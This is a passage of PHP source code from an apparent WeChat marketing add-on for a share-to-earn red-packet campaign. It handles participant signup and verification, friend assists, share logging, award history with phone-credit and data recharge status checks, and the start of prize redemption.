            $this->json_encode(array("success"=>2, "msg"=>'规则出错！...'));
        }
        if($reply['isshow'] != 1){
            $this->json_encode(array("success"=>2, "msg"=>'活动暂停，请稍后...'));
        }
        if ($reply['starttime'] > time()) {
            $this->json_encode(array("success"=>2, "msg"=>'活动还没有开始呢，请等待...'));
        }
        if ($reply['endtime'] < time()) {
            $this->json_encode(array("success"=>2, "msg"=>'活动已经结束了，下次再来吧！'));
        }
        if ($reply['issubscribe']&&intval($_W['fans']['follow'])==0) {
            $this->json_encode(array("success"=>2, "msg"=>'请先关注公共账号再来参与活动！详情请查看规则！'));
        }
		//规则判断
		//获得用户资料
		if($_W['member']['uid']){
			$profile = mc_fetch($_W['member']['uid'], array('avatar','nickname','realname','mobile','groupid','qq','email','address','gender','telephone','idcard','company','occupation','position'));
		}
		//获得用户资料			
		//验证系统会员组
		if($reply['issubscribe']==6){
			$grouparr = (array)iunserializer($reply['sys_users']);
			if(!in_array($profile['groupid'], $grouparr)) {
				$this->json_encode(array("success"=>2, "msg"=>$reply['sys_users_tips']));
			}
		}
		//验证系统会员组
		//获取openid
		$openid = $this->get_openid($rid);
		$from_user = $openid['openid'];
		$page_from_user = base64_encode(authcode($from_user, 'ENCODE'));
		//获取openid
        //判断是否参与过
		$fans = pdo_fetch("select * from ".tablename('stonefish_redfunshare_fans')." where rid = :rid and uniacid = :uniacid and from_user= :from_user", array(':rid' => $rid, ':uniacid' => $uniacid, ':from_user' => $from_user));
		if(empty($fans)){
			//是否收集手机号归属信息
			if(!empty($_GPC['mobile'])){
				$mobile_v = $this->mobile_verify($_GPC['mobile'],'');
				$mobile_v = explode("|", $mobile_v);
				$mobile_company = $mobile_v[0];
				$mobile_province = $mobile_v[1];
				$mobile_city = $mobile_v[2];
			}
			if(!empty($_GPC['mobile_company'])){
				$mobile_company = $_GPC['mobile_company'];
			}
			//是否收集手机号归属信息
			//限制类型
			$limit = 0;
			$exchange = pdo_fetch("select limittype,limitgender,limitcity FROM ".tablename("stonefish_redfunshare_exchange")." where rid = :rid", array(':rid' => $rid));
			if($exchange['limitgender']){
				if($exchange['limitgender']==$_GPC['sex'])$limitgender = 1;
			}else{
				$limitgender = 1;
			}
			if(!empty($exchange['limitcity'])){
				$exchange['limitcity'] = str_replace(array("\r\n","\r"),",",$exchange['limitcity']);
		        $cityarray = explode(',',$exchange['limitcity']);
				$city = $mobile_province.$mobile_city;
				if(empty($city))$city = $_GPC['province'].$_GPC['city'];
				if(in_array($city, $cityarray))$limitcity = 1;
			}else{
				$limitcity = 1;
			}
			if($limitcity && $limitgender)$limit = 1;
			if($limit==0 && $exchange['limittype']){
				$data = array(
					'success' => 2,
					'msg' => '不符合参与条件!',
				);
				$this->json_encode($data);
			}
			//限制类型
			//查询是否有福利以及验证
			if($reply['mobileverify'] && !empty($_GPC['mobile'])){
				$mobileverify = pdo_fetch("select * FROM ".tablename("stonefish_redfunshare_mobileverify")." where rid = :rid and uniacid = :uniacid and mobile = :mobile", array(':rid' => $rid,':uniacid' => $uniacid,':mobile' => $_GPC['mobile']));
				if(empty($mobileverify) && $reply['mobileverify']==1){
					$this->json_encode(array("success"=>2, "msg"=>'未成功验证手机号，请确认手机号码！'));
				}elseif($mobileverify['verifytime'] && $reply['mobileverify']==1){
					$this->json_encode(array("success"=>2, "msg"=>'此手机号码已使用过，请确认手机号码！'));
				}elseif($mobileverify['status']!=2 && $reply['mobileverify']==1){
					$this->json_encode(array("success"=>2, "msg"=>'此手机号码还未审核，请等待管理员审核后再来参加！'));
				}
			}			
			//查询是否有福利以及验证
			//判断是否作弊
			if($_GPC['inpoint']>$reply['inpointend']){
				$data = array(
					'success' => 2,
					'msg' => '请勿作弊!',
				);
				$this->json_encode($data);
			}
			//判断是否作弊
			//判断手机号是否参与过
			if(!empty($_GPC['mobile'])){
				$mobile = pdo_fetch("select id FROM ".tablename("stonefish_redfunshare_fans")." where rid = :rid and uniacid = :uniacid and mobile = :mobile", array(':rid' => $rid,':uniacid' => $uniacid,':mobile' => $_GPC['mobile']));
				if(!empty($mobile)){
					$data = array(
					    'success' => 2,
					    'msg' => '此手机号已参与过活动了，请勿重复参与!',
				    );
				    $this->json_encode($data);
				}
			}
			//判断手机号是否参与过
			//是否验证短信
			if($reply['smsverify']){
				if(!$this->code_verify($_GPC['mobile'], $_GPC['smsverify'])) {
					$data = array(
						'success' => 2,
						'msg' => '验证码错误!',
					);
					$this->json_encode($data);
				}
			}
			//是否验证短信
			$fansdata = array(
                'rid' => $rid,
				'uniacid' => $uniacid,
                'from_user' => $from_user,
				'avatar' => $_GPC['avatar'],
				'nickname' => $_GPC['nickname'],
				'inpoint' => $_GPC['inpoint'],
				'mobile_company' => $mobile_company,
				'mobile_province' => $mobile_province,
				'mobile_city' => $mobile_city,
				'limit' => $limit,
                'createtime' => time(),
            );
            pdo_insert('stonefish_redfunshare_fans', $fansdata);
            $fans['id'] = pdo_insertid();
			if($reply['mobileverify']){
			    pdo_update('stonefish_redfunshare_mobileverify', array('verifytime' => time()), array('id' => $mobileverify['id']));
			}
			load()->model('mc');
			$exchange = pdo_fetch("select * FROM ".tablename("stonefish_redfunshare_exchange")." where rid = :rid", array(':rid' => $rid));
			//自动读取会员信息存入FANS表中
			$ziduan = array('realname','mobile','qq','email','address','gender','telephone','idcard','company','occupation','position');
			foreach ($ziduan as $ziduans){
				if($exchange['is'.$ziduans]){
					if(!empty($_GPC[$ziduans])){
				        pdo_update('stonefish_redfunshare_fans', array($ziduans => $_GPC[$ziduans]), array('id' => $fans['id']));
				        if($exchange['isfans']){				            
                            if($ziduans=='email'){
								mc_update($_W['member']['uid'], array('email' => $_GPC['email']));
							}else{
								mc_update($_W['member']['uid'], array($ziduans => $_GPC[$ziduans],'email' => $profile['email']));
							}
				        }
					}
			    }
		    }
		    //自动读取会员信息存入FANS表中
			//发送消息模板之参与模板
			if($exchange['tmplmsg_participate']){
				$this->seed_tmplmsg($from_user,$exchange['tmplmsg_participate'],$rid,array('do' =>'index', 'nickname' =>$userinfo['nickname']));
			}
			//发送消息模板之参与模板
			//增加人数，和浏览次数
            pdo_update('stonefish_redfunshare_reply', array('fansnum' => $reply['fansnum'] + 1), array('id' => $reply['id']));
			//增加人数，和浏览次数
			$data = array(
                'success' => 1,
				'msg' => '用户资料保存成功!',
            );
		}else{
			$data = array(
                'success' => 2,
				'msg' => '已参与过活动，请勿重复参与!',
            );
		}
		//判断是否参与过
		$this->json_encode($data);
    }
	//用户注册
	//朋友助力
	public function doMobileFirend() {
        global $_GPC, $_W;
        $rid = intval($_GPC['rid']);		
		$uniacid = $_W['uniacid'];
		$acid = $_W['acid'];
        if(empty($rid))$this->message_tips($rid,'抱歉，参数错误！');
		$fromuser = authcode(base64_decode($_GPC['fromuser']), 'DECODE');
		$page_fromuser = $_GPC['fromuser'];
		$reply = pdo_fetch("select * from " . tablename('stonefish_redfunshare_reply') . " where rid = :rid order by `id` desc", array(':rid' => $rid));
		$template = pdo_fetch("select * from " . tablename('stonefish_redfunshare_template') . " where id = :id", array(':id' => $reply['templateid']));
		$share = pdo_fetch("select * from " . tablename('stonefish_redfunshare_share') . " where rid = :rid and acid = :acid", array(':rid' => $rid,':acid' => $acid));		
        //活动状态
		$this->check_reply($reply);		
		//活动状态	
		//获取openid
		$openid = $this->get_openid($rid);
		$from_user = $openid['openid'];
		$page_from_user = base64_encode(authcode($from_user, 'ENCODE'));
		//获取openid
		//参与者信息
		$fans = pdo_fetch("select * from ".tablename('stonefish_redfunshare_fans')." where rid = :rid and uniacid = :uniacid and from_user= :from_user", array(':rid' => $rid, ':uniacid' => $uniacid, ':from_user' => $fromuser));
		if(!empty($fans)){
			//判断是否作弊
			if($fans['status']==0 || $fans['inpoint']>$reply['inpointend']){
				$real_name = empty($fans['realname']) ? stripcslashes($fans['nickname']) : $fans['realname'];
				$this->message_tips($rid,'抱歉，活动中您〖'.$real_name.'〗可能有作弊行为已被管理员暂停屏蔽！请联系【'.$_W['account']['name'].'】管理员');
			}
			//判断是否作弊
		}
		//参与者信息
		//助力
		$firend = pdo_fetchall("select * from " . tablename('stonefish_redfunshare_sharedata') . " where rid = :rid and uniacid = :uniacid and fromuser = :from_user and share_type=1 order by `id` desc", array(':rid' => $rid,':uniacid' => $uniacid,':from_user' => $fromuser));
		foreach ($firend as $mid => $firends) {			    
			if(empty($firends['nickname'])){
				$firend[$mid]['nickname'] = '匿名好友';
			}
			if(empty($firends['avatar'])){
				$firend[$mid]['avatar'] = '../addons/stonefish_redfunshare/template/images/avatar.jpg';
			}else{
				$firend[$mid]['avatar'] = $firends['avatar'];
			}
		}
		$sharepoint = pdo_fetchcolumn("select sum(sharepoint) from " . tablename('stonefish_redfunshare_sharedata') . " where rid = :rid and uniacid = :uniacid and fromuser = :fromuser and share_type=1 and from_user = :from_user", array(':rid' => $rid,':uniacid' => $uniacid,':fromuser' => $fromuser,':from_user' => $from_user));
		//助力
	    //获取粉丝信息
		$userinfo = $this->get_userinfo($reply['power'],$rid,$iid,$page_fromuser,'firend');
		//获取粉丝信息
		//查询是否参与活动
		$myfans = pdo_fetch("select id from ".tablename('stonefish_redfunshare_fans')." where rid = :rid and uniacid = :uniacid and from_user= :from_user", array(':rid' => $rid, ':uniacid' => $uniacid, ':from_user' => $from_user));
		//查询是否参与活动
		//分享信息
        $sharelink = $_W['siteroot'] .'app/'.substr($this->createMobileUrl('entry', array('rid' => $rid,'from_user' => $page_fromuser,'entrytype' => 'shareview')),2);
        $sharetitle = empty($share['share_title']) ? '欢迎参加活动' : $share['share_title'];
        $sharedesc = empty($share['share_desc']) ? '亲，欢迎参加活动，祝您好运哦！！' : str_replace("\r\n"," ", $share['share_desc']);
		$sharetitle = $this->get_share($rid,$fromuser,$sharetitle);
		$sharedesc = $this->get_share($rid,$fromuser,$sharedesc);
		if(!empty($share['share_img'])){
		    $shareimg = toimage($share['share_img']);
		}else{
		    $shareimg = toimage($reply['start_picurl']);
		}
		//分享信息
		if($this->Weixin()){
			include $this->template('firend');
		}else{
			$this->Weixin();
		}
    }
	//朋友助力	
	//分享成功
	public function doMobileShare_confirm() {
        global $_GPC, $_W;
        $rid = intval($_GPC['rid']);
		$iid = intval($_GPC['iid']);
		$uniacid = $_W['uniacid'];
		$fromuser = authcode(base64_decode($_GPC['fromuser']), 'DECODE');
		$reply = pdo_fetch("select power from " . tablename('stonefish_redfunshare_reply') . " where rid = :rid order by `id` desc", array(':rid' => $rid));
		//获取openid
		$openid = $this->get_openid($rid);
		$from_user = $openid['openid'];
		$page_from_user = base64_encode(authcode($from_user, 'ENCODE'));
		//获取openid
		if(empty($fromuser)){
			$fromuser = $from_user;
		}
		$fans = pdo_fetch("select * from " . tablename('stonefish_redfunshare_fans') . " where rid = :rid and uniacid = :uniacid and from_user = :from_user", array(':rid' => $rid, ':uniacid' => $uniacid, ':from_user' => $from_user));
		if ($fans == true) {
			//保存分享次数
			pdo_update('stonefish_redfunshare_fans', array('share_num' => $fans['share_num']+1,'sharetime' => time()), array('id' => $fans['id']));
			$fanssharedata = array(
                'rid' => $rid,
			    'uniacid' => $uniacid,
			    'fromuser' => $fromuser,
				'from_user' => $from_user,
			    'avatar' => $_GPC['headimgurl'],
		        'nickname' => $_GPC['nickname'],
                'visitorsip' => getip(),
			    'visitorstime' => time(),
            );
		    pdo_insert('stonefish_redfunshare_sharedata', $fanssharedata);
			$data = array(
                'msg' => '分享成功！',
                'success' => 1,
            );
		}else{
			$data = array(
                'msg' => '感觉您为您的好友分享!',
                'success' => 0,
            );
		}
        $this->Json_encode($data);
    }
	//分享成功
	//活动规则
	public function doMobileRule() {
        global $_GPC, $_W;
        $rid = intval($_GPC['rid']);		
		$uniacid = $_W['uniacid'];
		$acid = $_W['acid'];
        if(empty($rid))$this->message_tips($rid,'抱歉，参数错误！');
		$reply = pdo_fetch("select * from " . tablename('stonefish_redfunshare_reply') . " where rid = :rid order by `id` desc", array(':rid' => $rid));
		$template = pdo_fetch("select * from " . tablename('stonefish_redfunshare_template') . " where id = :id", array(':id' => $reply['templateid']));
		$share = pdo_fetch("select * from " . tablename('stonefish_redfunshare_share') . " where rid = :rid and acid = :acid", array(':rid' => $rid,':acid' => $acid));
        //活动状态
		$this->check_reply($reply);		
		//活动状态
		//虚拟人数
		$this->xuni_time($reply);
		//虚拟人数
		//获取openid
		$openid = $this->get_openid($rid);
		$from_user = $openid['openid'];
		$page_from_user = base64_encode(authcode($from_user, 'ENCODE'));
		//获取openid
		//获得用户资料
		if($_W['member']['uid']){
			$profile = mc_fetch($_W['member']['uid'], array('avatar','nickname','realname','mobile','groupid','qq','email','address','gender','telephone','idcard','company','occupation','position'));
		}
		//获得用户资料
	    //获取粉丝信息
		$userinfo = $this->get_userinfo($reply['power'],$rid,$iid,$page_fromuser,'rule');
		//获取粉丝信息
		//查询是否参与活动并更新任务情况
		$fans = pdo_fetch("select * from ".tablename('stonefish_redfunshare_fans')." where rid = :rid and uniacid = :uniacid and from_user= :from_user", array(':rid' => $rid, ':uniacid' => $uniacid, ':from_user' => $from_user));
		if(!empty($fans)){
			//判断是否作弊
			if($fans['status']==0 || $fans['inpoint']>$reply['inpointend']){
				$real_name = empty($fans['realname']) ? stripcslashes($fans['nickname']) : $fans['realname'];
				$this->message_tips($rid,'抱歉，活动中您〖'.$real_name.'〗可能有作弊行为已被管理员暂停屏蔽！请联系【'.$_W['account']['name'].'】管理员');
			}
			//判断是否作弊
		}
		//查询是否参与活动并更新任务情况
		if($this->Weixin()){
			include $this->template('rule');
		}else{
			$this->Weixin();
		}
    }
	//活动规则
	//我的兑奖记录
	public function doMobileMyaward() {
        global $_GPC, $_W;
        $rid = intval($_GPC['rid']);		
		$uniacid = $_W['uniacid'];
		$acid = $_W['acid'];
        if(empty($rid))$this->message_tips($rid,'抱歉，参数错误！');
		$reply = pdo_fetch("select * from " . tablename('stonefish_redfunshare_reply') . " where rid = :rid order by `id` desc", array(':rid' => $rid));
		$template = pdo_fetch("select * from " . tablename('stonefish_redfunshare_template') . " where id = :id", array(':id' => $reply['templateid']));
		$share = pdo_fetch("select * from " . tablename('stonefish_redfunshare_share') . " where rid = :rid and acid = :acid", array(':rid' => $rid,':acid' => $acid));
		$exchange = pdo_fetch("select isfansname,isrealname,ismobile,yidong_tips,liantong_tips,dianxin_tips FROM ".tablename("stonefish_redfunshare_exchange")." where rid = :rid", array(':rid' => $rid));
		//兑奖参数重命名
		$isfansname = explode(',',$exchange['isfansname']);
		//兑奖参数重命名
        //活动状态
		$this->check_reply($reply);		
		//活动状态	
		//获取openid
		$openid = $this->get_openid($rid);
		$from_user = $openid['openid'];
		$page_from_user = base64_encode(authcode($from_user, 'ENCODE'));
		//获取openid
		//获取粉丝信息
		$userinfo = $this->get_userinfo($reply['power'],$rid,$iid,$page_fromuser,'myaward');
		//获取粉丝信息
		//参与者信息
		$fans = pdo_fetch("select * from ".tablename('stonefish_redfunshare_fans')." where rid = :rid and uniacid = :uniacid and from_user= :from_user", array(':rid' => $rid, ':uniacid' => $uniacid, ':from_user' => $from_user));
		if(!empty($fans)){
			//判断是否作弊
			if($fans['status']==0 || $fans['inpoint']>$reply['inpointend']){
				$real_name = empty($fans['realname']) ? stripcslashes($fans['nickname']) : $fans['realname'];
				$this->message_tips($rid,'抱歉，活动中您〖'.$real_name.'〗可能有作弊行为已被管理员暂停屏蔽！请联系【'.$_W['account']['name'].'】管理员');
			}
			//判断是否作弊
		}
		//参与者信息
		//提示词
		if($fans['mobile_company']=='中国联通')$exchangetips = $exchange['liantong_tips'];
		if($fans['mobile_company']=='中国移动')$exchangetips = $exchange['yidong_tips'];
		if($fans['mobile_company']=='中国电信')$exchangetips = $exchange['dianxin_tips'];
		//提示词
		//兑换记录
		$fansaward = pdo_fetchall("select * from " . tablename('stonefish_redfunshare_fansaward') . " where rid = :rid and uniacid = :uniacid and from_user = :from_user order by `id` desc", array(':rid' => $rid,':uniacid' => $uniacid,':from_user' => $from_user));
		if($reply['redpacktype']==1){
		    //读取话费接口配置
		    $config = pdo_fetch("SELECT * FROM ".tablename('stonefish_redfunshare_apiconfig')." WHERE uniacid = '{$_W['uniacid']}' and apitype='mobileofpay' order by id desc");
		    $appkey = $config['key'];
		    $openid = $config['sign'];
		    $recharge = new recharge($appkey,$openid);
		    //读取话费接口配置
		}
		if($reply['redpacktype']==2){
		    //读取流量接口配置
		    $config = pdo_fetch("SELECT * FROM ".tablename('stonefish_redfunshare_apiconfig')." WHERE uniacid = '{$_W['uniacid']}' and apitype='mobileofflow' order by id desc");
		    $appkey = $config['key'];
		    $openid = $config['sign'];
		    $recharge = new recharge($appkey,$openid);
		    //读取流量接口配置
		}
		foreach ($fansaward as &$item) {
			if($reply['seedredpack']){
				if($reply['redpacktype']==0){
					if($item['zhongjiang']==1){
					    $item['zhuangtai'] = '[审核中]';
				    }
				    if($item['zhongjiang']==2){
					    $item['zhuangtai'] = '[已兑换]';
				    }
				}				
				//话费订单
			    if($reply['redpacktype']==1){
				    $orderid = $item['codesn'];
				    $orderStatusRes = $recharge->sta($orderid);
					if($orderStatusRes){
						if($orderStatusRes['error_code'] == '0'){
    				        if($orderStatusRes['result']['game_state'] =='0'){
        				        $item['zhuangtai'] = '[充值中]';
    				        }elseif($orderStatusRes['result']['game_state'] =='1'){
        				        $item['zhuangtai'] = '[已兑换]';
    				        }elseif($orderStatusRes['result']['game_state'] =='9'){
        				        $item['zhuangtai'] = $this->juhe_api($item['id']);
    				        }elseif($orderStatusRes['result']['game_state'] =='-1'){
        				        $item['zhuangtai'] = $this->juhe_api($item['id']);
    				        }
				        }else{
    				        $item['zhuangtai'] = '[查询中]';
				        }
					}else{
						$item['zhuangtai'] = '[查询失败]';
					}
				    
			    }
			    //话费订单
			    //流量订单
			    if($reply['redpacktype']==2){
				    $orderid = $item['codesn'];
				    $orderStatusRes = $recharge->batchquery($orderid);
					if($orderStatusRes){
						if($orderStatusRes['error_code'] == '0'){
    				        if($orderStatusRes['result'][0]['game_state'] =='0'){
        				        $item['zhuangtai'] = '[充值中]';
    				        }elseif($orderStatusRes['result'][0]['game_state'] =='1'){
        				        $item['zhuangtai'] = '[已兑换]';
    				        }elseif($orderStatusRes['result'][0]['game_state'] =='9'){
        				        $item['zhuangtai'] = $this->juhe_api($item['id']);
    				        }elseif($orderStatusRes['result'][0]['game_state'] =='-1'){
        				       $item['zhuangtai'] = $this->juhe_api($item['id']);
    				        }
				        }else{
    				        $item['zhuangtai'] = '[查询中]';
				        }
					}else{
						$item['zhuangtai'] = '[查询失败]';
					}				    
			    }
			    //流量订单
			}else{
				if($item['zhongjiang']==1){
					$item['zhuangtai'] = '[审核中]';
				}
				if($item['zhongjiang']==2){
					$item['zhuangtai'] = '[已兑换]';
				}
			}
			
		}
		//兑换记录
		//所有兑奖数
		$fansawardnum = pdo_fetchcolumn("select count(id) FROM ".tablename('stonefish_redfunshare_fansaward')." where uniacid = :uniacid and rid = :rid", array(':uniacid' => $uniacid,':rid' => $rid));
		$myawardnum = pdo_fetchcolumn("select count(id) FROM ".tablename('stonefish_redfunshare_fansaward')." where uniacid = :uniacid and rid = :rid and from_user = :from_user", array(':uniacid' => $uniacid,':rid' => $rid,':from_user' => $from_user));
		//所有兑奖数
		//兑换列表
		if(!empty($reply["redpack_meun"])){
			$redpack_meun = str_replace(array("\r\n","\r"),",",$reply["redpack_meun"]);
		    $redpack_meun = explode(',',$redpack_meun);
		}else{
			$redpack_meun = '';
		}
		//兑换列表
		//流量套餐
		if($reply['redpacktype']==2){
			//读取流量配置
			$config = pdo_fetch("SELECT * FROM ".tablename('stonefish_redfunshare_apiconfig')." WHERE uniacid = '{$_W['uniacid']}' and apitype='mobileofflow' order by id desc");
			$appkey = $config['key']; 
			$openid = $config['sign'];
			$recharge = new recharge($appkey,$openid);
			//读取流量配置
			$procResult = $recharge->flowtelcheck($fans['mobile']);
			if($procResult){
				if($procResult['error_code']=='0'){
					$redpack_meun=$procResult['result'][0]['flows'];
				}
			}
		}
		//流量套餐
		//分享信息
        $sharelink = $_W['siteroot'] .'app/'.substr($this->createMobileUrl('entry', array('rid' => $rid,'from_user' => $page_from_user,'entrytype' => 'shareview')),2);
        $sharetitle = empty($share['share_title']) ? '欢迎参加活动' : $share['share_title'];
        $sharedesc = empty($share['share_desc']) ? '亲，欢迎参加活动，祝您好运哦！！' : str_replace("\r\n"," ", $share['share_desc']);
		$sharetitle = $this->get_share($rid,$from_user,$sharetitle);
		$sharedesc = $this->get_share($rid,$from_user,$sharedesc);
		if(!empty($share['share_img'])){
		    $shareimg = toimage($share['share_img']);
		}else{
		    $shareimg = toimage($reply['start_picurl']);
		}
		if($this->Weixin()){
			include $this->template('myaward');
		}else{
			$this->Weixin();
		}
    }
	//我的兑奖记录
	//重新充值juheapi接口（话费、流量）
	public function Juhe_api($id){
        global $_W, $_GPC;
        if(empty($id)){
			return '查询ID失败';
			exit;
		}
		$data = pdo_fetch("select * FROM " . tablename('stonefish_redfunshare_fansaward') . " where id = :id", array(':id' => $id));
		$reply = pdo_fetch("select redpacktype,seedredpack,danwei,redpack from ".tablename('stonefish_redfunshare_reply')." where rid = :rid and uniacid=:uniacid", array(':rid' => $data['rid'], ':uniacid' => $_W['uniacid']));
		if($data['error_num']>=5){
			if($data['error_seed']){
				$setting = $this->module['config'];
			    $kefuopenid = $setting['stonefish_redfunshare_kefuopenid'];
			    if(!empty($kefuopenid)){
				    $this->sendtext($_W['account']['name'].'粉丝参与rid:'.$data['rid'].'活动中，在线自动充值失败次数超过5次了，请查看！',$kefuopenid);
			    }
			    $text = '由于网络原因，您于'.date('Y/m/d H:i',$data['consumetime']).'申请兑换的'.$data['outpoint'].' '.$reply['danwei'].' '.$reply['redpack'].'充值超时，已通知'.$_W['account']['name'].'管理员为您排查原因，请等待！为您带来不便，敬请谅解！';
			    $this->sendtext($text,$data['from_user']);
			    $rec['error_seed'] = 0;
			    pdo_update('stonefish_redfunshare_fansaward',$rec,array('id'=>$id));
			}
			return '等待处理';
			exit;
		}		
		$codesn = date("YmdHis").mt_rand(1000,9999);
		//话费订单
		if($reply['redpacktype']==1){
			//读取话费接口配置
			$config = pdo_fetch("SELECT * FROM ".tablename('stonefish_redfunshare_apiconfig')." WHERE uniacid = '{$_W['uniacid']}' and apitype='mobileofpay' order by id desc");
			$appkey = $config['key']; 
			$openid = $config['sign'];
			$recharge = new recharge($appkey,$openid);
			//读取话费接口配置
			$fans = pdo_fetch("select mobile,id FROM " . tablename('stonefish_redfunshare_fans') . " where rid = :rid and uniacid = :uniacid and from_user = :from_user", array(':rid' => $data['rid'],':uniacid' => $data['uniacid'],':from_user' => $data['from_user']));
			//重新提交
			$procResult = $recharge->telcheck($fans['mobile'],intval($data['outpoint']));
			if(!$procResult){
				return '您的手机号不支持此面额充值';
				exit;
			}else{
				$procResult = $recharge->telcz($fans['mobile'],intval($data['outpoint']),$codesn);
				if($procResult){
					if($procResult['error_code'] == "0"){
					    $consumetime = $data['consumetime'];
					    $rec['log']=$procResult['result']['sporder_id'];
					    $rec['zhongjiang']=2;
					    $rec['consumetime']=time();
					    $rec['completed']=1;
					    $rec['codesn']=$codesn;
					    $rec['ticketname']='聚合接口';
					    $rec['error_num']=$data['error_num']+1;
					    pdo_update('stonefish_redfunshare_fansaward',$rec,array('id'=>$id));
					    pdo_update('stonefish_redfunshare_fans', array('zhongjiang'=>2), array('id' => $fans['id']));
					    $text = '由于网络原因，您于'.date('Y/m/d H:i',$consumetime).'申请兑换的'.$data['outpoint'].'元话费红包终于充值成功,请咨询手机号：'.$fans['mobile'].' 的运营商客服或APP查询是否到账！';
					    $this->sendtext($text,$data['from_user']);
					    return '充值成功';
					    exit;
				    }else{
					    $rec['error_num']=$data['error_num']+1;
				        pdo_update('stonefish_redfunshare_fansaward',$rec,array('id'=>$id));
					    return '再次充值中';
					    exit;
				    }
				}else{
					return '再次充值失败';
					exit;
				}				
			}
			//重新提交
		}
		//话费订单
		//流量订单
		if($reply['redpacktype']==2){
			//重新提交
			//读取流量配置
			$config = pdo_fetch("SELECT * FROM ".tablename('stonefish_redfunshare_apiconfig')." WHERE uniacid = '{$_W['uniacid']}' and apitype='mobileofflow' order by id desc");
			$appkey = $config['key']; 
			$openid = $config['sign'];
			$recharge = new recharge($appkey,$openid);
			//读取流量配置						
			$procResult = $recharge->flowcz($fans['mobile'],$data['completed'],$codesn);
			if($procResult){
				if($procResult['error_code']=='0'){
    			    $consumetime = $data['consumetime'];
				    $rec['log']=$procResult['result']['sporder_id'];
				    $rec['zhongjiang']=2;
				    $rec['consumetime']=time();
				    $rec['codesn']=$codesn;
				    $rec['ticketname']='聚合接口';
				    pdo_update('stonefish_redfunshare_fansaward',$rec,array('id'=>$id));
				    pdo_update('stonefish_redfunshare_fans', array('zhongjiang'=>2), array('id' => $fans['id']));
				    $text = '由于网络原因，您于'.date('Y/m/d H:i',$consumetime).'申请兑换的'.$data['outpoint'].'M流量红包终于充值成功,请咨询手机号：'.$fans['mobile'].' 的运营商客服或APP查询是否到账！';
				    $this->sendtext($text,$data['from_user']);
				    return '充值成功';
				    exit;
    		    }else{
				    $rec['error_num']=$data['error_num']+1;
				    pdo_update('stonefish_redfunshare_fansaward',$rec,array('id'=>$id));
				    return '再次充值中';
				    exit;
    		    }
			}else{
				return '再次充值失败';
				exit;
			}
    		
			//重新提交
		}
		//流量订单
    }
	//重新充值juheapi接口（话费、流量）
	//兑奖
	public function doMobileDuihuan() {
        global $_GPC, $_W;
        $rid = intval($_GPC['rid']);
		$uniacid = $_W['uniacid'];
		$reply = pdo_fetch("select sharepoint,prize_num,redpack,award_num,maxsharepoint,danwei,redpacktype,seedredpack,inpointend,redpack_tips from " . tablename('stonefish_redfunshare_reply') . " where rid = :rid order by `id` desc", array(':rid' => $rid));
		//获取openid
		$openid = $this->get_openid($rid);
		$from_user = $openid['openid'];
		$page_from_user = base64_encode(authcode($from_user, 'ENCODE'));
		//获取openid
		if($reply['redpacktype']==2 && $reply['seedredpack']){
			$duihuan = explode("|",$_GPC['duihuanshu']);
			$orderid = $duihuan[0];
			$_GPC['duihuanshu'] = $duihuan[1];
			$inprice = $duihuan[2];
		}
		$fans = pdo_fetch("select id,status,inpoint,outpoint,sharepoint,mobile,nickname,realname from " . tablename('stonefish_redfunshare_fans') . " where rid = :rid and uniacid = :uniacid and from_user = :from_user", array(':rid' => $rid, ':uniacid' => $uniacid, ':from_user' => $from_user));
		if ($fans == true) {
			//判断是否作弊
			if($fans['status']==0 || $fans['inpoint']>$reply['inpointend']){
				$real_name = empty($fans['realname']) ? stripcslashes($fans['nickname']) : $fans['realname'];
				$data = array(
                    'msg' => '抱歉，活动中您〖'.$real_name.'〗可能有作弊行为已被管理员暂停屏蔽！请联系【'.$_W['account']['name'].'】管理员',
                    'success' => 0,
                );
				$this->Json_encode($data);
			}
			//判断是否作弊
			if(number_format($fans['inpoint']+$fans['sharepoint']-$fans['outpoint'],2)>=$reply['sharepoint']){
				$fansawardnum = pdo_fetchcolumn("select count(id) FROM ".tablename('stonefish_redfunshare_fansaward')." where uniacid = :uniacid and rid = :rid", array(':uniacid' => $uniacid,':rid' => $rid));
				$myawardnum =  pdo_fetchcolumn("select count(id) FROM ".tablename('stonefish_redfunshare_fansaward')." where uniacid = :uniacid and rid = :rid and from_user = :from_user", array(':uniacid' => $uniacid,':rid' => $rid,':from_user' => $from_user));
				if($fansawardnum>=$reply['prize_num'] && $reply['prize_num']>0){
					$data = array(
                        'msg' => $reply['redpack'].'发完了',
                        'success' => 0,
                    );
					$this->Json_encode($data);
				}
				if($myawardnum>=$reply['award_num'] && $reply['award_num']>0){
					$data = array(
                        'msg' => '您的机会用完了！',
                        'success' => 0,
                    );
					$this->Json_encode($data);
				}
				if($_GPC['duihuanshu']<$reply['sharepoint']){
					$data = array(
                        'msg' => '申请兑换数不能小于最小数：'.$reply['sharepoint'],
                        'success' => 0,
                    );
					$this->Json_encode($data);
				}
				if($_GPC['duihuanshu']>$reply['maxsharepoint']){
					$data = array(
                        'msg' => '申请兑换数不能大于最大数：'.$reply['maxsharepoint'],
                        'success' => 0,
                    );
					$this->Json_encode($data);
				}
				if(number_format($fans['inpoint']+$fans['sharepoint']-$fans['outpoint']-$_GPC['duihuanshu'],2)<0){
					$data = array(
                        'msg' => '余额不足',
                        'success' => 0,
                    );
					$this->Json_encode($data);
				}
				if($fans['outpoint']>=$reply['maxsharepoint'] && $reply['maxsharepoint']>0){
					$data = array(
                        'msg' => "您已申请兑换到达".$reply['maxsharepoint']." ".$reply['danwei']."了，留点给别人吧！",
                        'success' => 0,
                    );
					$this->Json_encode($data);
				}				
				$codesn = date("YmdHis").mt_rand(1000,9999);
			    $fansawarddata = array(
                    'rid' => $rid,
			        'uniacid' => $uniacid,
				    'from_user' => $from_user,
			        'codesn' => $codesn,
				    'zhongjiang' =>1,
				    'outpoint' => $_GPC['duihuanshu'],
			        'createtime' => time(),
                );
		        pdo_insert('stonefish_redfunshare_fansaward', $fansawarddata);
				$fansawardid = pdo_insertid();//取id
			    $outpoint = pdo_fetchcolumn("select sum(outpoint) FROM ".tablename('stonefish_redfunshare_fansaward')." where uniacid = :uniacid and rid = :rid and from_user = :from_user", array(':uniacid' => $uniacid,':rid' => $rid,':from_user' => $from_user));
			    pdo_update('stonefish_redfunshare_fans', array('outpoint'=>$outpoint,'zhongjiang'=>1), array('id' => $fans['id']));
				//兑换红包
				if($reply['redpacktype']==0 && $reply['seedredpack']){
					if($_GPC['duihuanshu']<1){
						$data = array(
                            'msg' => '提现红包不能小于１元!',
                            'success' => 0,
                        );
						$this->Json_encode($data);
					}
					$_desc= $reply['redpack_tips'].'申请红包提现：'.$_GPC['duihuanshu'].'元';
